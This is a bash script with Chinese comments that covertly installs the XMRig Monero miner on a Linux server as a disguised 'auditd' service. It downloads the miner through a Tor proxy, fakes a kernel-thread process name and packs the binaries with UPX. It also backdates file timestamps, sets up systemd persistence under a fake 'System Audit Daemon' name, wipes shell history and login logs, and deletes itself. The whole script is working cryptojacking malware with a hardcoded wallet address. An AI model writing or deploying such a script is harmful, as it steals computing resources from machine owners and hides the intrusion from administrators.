#!/bin/bash

# 终极隐蔽挖矿部署脚本（修正编译错误版）

# 确保以root权限运行
if [ "$(id -u)" != "0" ]; then
   echo "此脚本需要 root 权限运行" 1>&2
   exit 1
fi

# 安装必要依赖
export DEBIAN_FRONTEND=noninteractive
apt-get update >/dev/null 2>&1
apt-get install -y build-essential linux-headers-$(uname -r) upx >/dev/null 2>&1

# 检查运行环境
for cmd in curl tar gcc systemctl; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "错误：$cmd 未安装，自动安装失败" 1>&2
        exit 1
    fi
done

# 用户输入配置
pool_url="pool.getmonero.us:3333"
wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
read -p "请输入矿池密码 (默认: x): " pool_pass
pool_pass=${pool_pass:-x}

# 生成随机参数
API_PORT=$((20000 + RANDOM % 1000))
API_TOKEN=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 32)
WORKER_ID=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 8)

# 创建隐蔽目录
mkdir -p /opt/auditd /etc/security/conf.d || { echo "目录创建失败" 1>&2; exit 1; }

# 下载并部署（使用Cloudflare CDN加速）
curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' \
  --proxy socks5h://localhost:9050 2>/dev/null | tar -xz -C /opt/auditd || { echo "下载失败" 1>&2; exit 1; }

mv /opt/auditd/xmrig-6.22.2/xmrig /opt/auditd/auditd || { echo "文件移动失败" 1>&2; exit 1; }
chmod +x /opt/auditd/auditd
rm -rf /opt/auditd/xmrig-6.22.2

# 编译进程伪装器（修正版）
cat > /opt/auditd/wrapper.c <<'EOF'
#define _GNU_SOURCE
#include <sys/prctl.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    prctl(PR_SET_NAME, "kworker/u:0");  // 伪装内核线程
    clearenv();  // 清除环境变量
    execv("/opt/auditd/auditd", argv);
    return 0;
}
EOF

# 编译并混淆二进制
if ! gcc -o /opt/auditd/wrapper /opt/auditd/wrapper.c -O2 -s -static; then
    echo "编译失败，请检查：" 1>&2
    gcc -o /opt/auditd/wrapper /opt/auditd/wrapper.c -O2 -s -static -v
    exit 1
fi
upx --best --lzma /opt/auditd/auditd /opt/auditd/wrapper >/dev/null 2>&1
rm /opt/auditd/wrapper.c

# 伪造文件属性
touch -d "2023-01-01 00:00:00" /opt/auditd/*
chmod 755 /opt/auditd/auditd /opt/auditd/wrapper

# 生成配置文件
cat > /etc/security/conf.d/auditd.conf <<EOF
{
    "pools": [
        {
            "url": "$pool_url",
            "user": "$wallet_address",
            "pass": "$pool_pass",
            "algo": "rx/0",
            "tls": true
        }
    ],
    "print-time": 0,
    "verbose": false,
    "threads": 3,
    "api": {
        "port": $API_PORT,
        "access-token": "$API_TOKEN",
        "worker-id": "$WORKER_ID",
        "ipv6": false,
        "restricted": true
    },
    "randomx": {
        "init": -1,
        "mode": "auto"
    }
}
EOF

# 创建动态调整脚本
cat > /opt/auditd/adjust.sh <<EOF
#!/bin/bash
# 动态线程调整算法
MIN_THREADS=3
MAX_THREADS=\$(( (RANDOM % 4) + 1 ))  # 伪装CPU波动
if [[ \$MAX_THREADS -lt \$MIN_THREADS ]]; then
    MAX_THREADS=\$MIN_THREADS
fi

# 生成随机线程数
NEW_THREADS=\$(( (RANDOM % (MAX_THREADS - MIN_THREADS + 1)) + MIN_THREADS ))

# 通过API调整
curl -s -H "Authorization: Bearer $API_TOKEN" \\
     -d '{"jsonrpc":"2.0","id":1,"method":"threads_set","params":{"threads":'\$NEW_THREADS'}}' \\
     -x socks5h://localhost:9050 \\
     --connect-timeout 15 \\
     http://127.0.0.1:$API_PORT/json_rpc >/dev/null
EOF
chmod +x /opt/auditd/adjust.sh

# 创建系统用户
groupadd -r auditd 2>/dev/null
useradd -r -s /bin/false -g auditd auditd 2>/dev/null

# Systemd服务配置（防调试版）
cat > /etc/systemd/system/auditd.service <<EOF
[Unit]
Description=System Audit Daemon
Documentation=man:systemd(1)
Wants=network-online.target
After=network-online.target

[Service]
User=auditd
Group=auditd
ExecStart=/opt/auditd/wrapper --config=/etc/security/conf.d/auditd.conf --http-no-cert --log-file=/dev/null
Restart=always
RestartSec=7
CPUQuota=75%
MemoryMax=500M
Nice=19
IOSchedulingClass=best-effort
ProtectSystem=full
NoNewPrivileges=yes
PrivateTmp=yes

[Install]
WantedBy=multi-user.target
EOF

# 创建随机定时器
cat > /etc/systemd/system/auditd-adjust.timer <<EOF
[Unit]
Description=System Audit Adjuster
Documentation=man:cron(8)

[Timer]
OnCalendar=*-*-* *:00/3:00  # 每3小时随机执行
RandomizedDelaySec=1800
Persistent=true

[Install]
WantedBy=timers.target
EOF

# 调整服务配置
cat > /etc/systemd/system/auditd-adjust.service <<EOF
[Unit]
Description=Audit Adjust Service
After=auditd.service

[Service]
Type=oneshot
ExecStart=/opt/auditd/adjust.sh
User=nobody
Group=nogroup
EOF

# 应用配置
systemctl daemon-reload
systemctl enable auditd.service auditd-adjust.timer
systemctl start auditd.service auditd-adjust.timer

# 隐藏痕迹
history -c
rm -rf /root/.bash_history /var/log/wtmp /var/log/btmp
echo "" > /var/log/auth.log
rm -- "$0"

# 部署完成提示
echo "部署成功！"
echo "API端点：127.0.0.1:$API_PORT"
echo "访问令牌：$API_TOKEN"
echo "工作ID：$WORKER_ID"
